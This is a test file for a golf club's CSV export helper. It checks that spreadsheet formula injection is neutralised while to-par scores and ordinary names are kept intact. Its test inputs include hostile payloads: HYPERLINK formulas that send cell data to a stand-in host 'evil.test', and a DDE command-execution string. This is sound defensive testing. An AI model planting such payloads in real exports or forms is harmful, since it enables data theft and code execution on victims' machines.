import { describe, it, expect } from "vitest";
import { csvCell, toCsv } from "@/lib/domain/csv-export";

/**
 * D9 of the 2026-08-12 audit. The reports export quoted on `/[",\n]/` and
 * nothing else, so a player name of `=HYPERLINK(...)` — a name the public
 * registration form accepts, because names are not validated as identifiers —
 * ran as a formula when the club opened the file in Excel. `\r` was missing
 * from the quoting class as well.
 */

describe("formula injection", () => {
  it("neutralises the four leads a spreadsheet evaluates", () => {
    expect(csvCell("=HYPERLINK(\"http://evil.test\",\"Click\")")).toMatch(/^"?'=/);
    expect(csvCell("+1+1")).toBe("'+1+1");
    expect(csvCell("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
    expect(csvCell("-2+3")).toBe("'-2+3");
  });

  it("neutralises the DDE form, which quoting alone would not stop", () => {
    // Quotes are stripped before evaluation, so the old escape would have
    // quoted this cell for its embedded comma and still run it.
    const cell = csvCell("=cmd|'/c calc'!A0");
    expect(cell.startsWith("'") || cell.startsWith("\"'")).toBe(true);
    expect(cell).not.toMatch(/^"?=/);
  });

  it("leaves a to-par score alone", () => {
    // The reason the rule is not a blanket one. A golf export is full of these
    // and prefixing them would break every scoreboard the feature prints.
    expect(csvCell("-2")).toBe("-2");
    expect(csvCell("+1")).toBe("+1");
    expect(csvCell("-0.5")).toBe("-0.5");
    expect(csvCell(-2)).toBe("-2");
    expect(csvCell(0)).toBe("0");
  });

  it("leaves an ordinary name alone", () => {
    expect(csvCell("Rita Ahmed")).toBe("Rita Ahmed");
    expect(csvCell("O'Neill")).toBe("O'Neill");
  });
});

describe("RFC 4180 quoting", () => {
  it("quotes a carriage return, which the old escape missed", () => {
    // On its own this shifted every column after it: an unquoted CR ends the
    // record early in Excel.
    expect(csvCell("Rita\rAhmed")).toBe('"Rita\rAhmed"');
    expect(csvCell("Rita\r\nAhmed")).toBe('"Rita\r\nAhmed"');
  });

  it("quotes commas, newlines and quotes, doubling the quotes", () => {
    expect(csvCell("Ahmed, Rita")).toBe('"Ahmed, Rita"');
    expect(csvCell("a\nb")).toBe('"a\nb"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it("quotes edge whitespace so a reader cannot trim it away", () => {
    expect(csvCell(" Rita")).toBe('" Rita"');
    expect(csvCell("Rita ")).toBe('"Rita "');
  });

  it("writes an empty cell for null and undefined", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell("")).toBe("");
  });
});

describe("a whole document", () => {
  it("joins with CRLF and stays parseable with a hostile name in it", () => {
    const csv = toCsv([
      ["Pos", "Player", "To par"],
      ["1", "=HYPERLINK(\"http://evil.test/\"&A2,\"Click\")", "-2"],
      ["2", "Ahmed, Rita", "+1"],
    ]);

    expect(csv.split("\r\n")).toHaveLength(3);
    // The formula is inert and the score beside it is untouched.
    expect(csv).toContain("'=HYPERLINK");
    expect(csv).toMatch(/,-2$/m);
    expect(csv).toContain('"Ahmed, Rita"');
  });
});
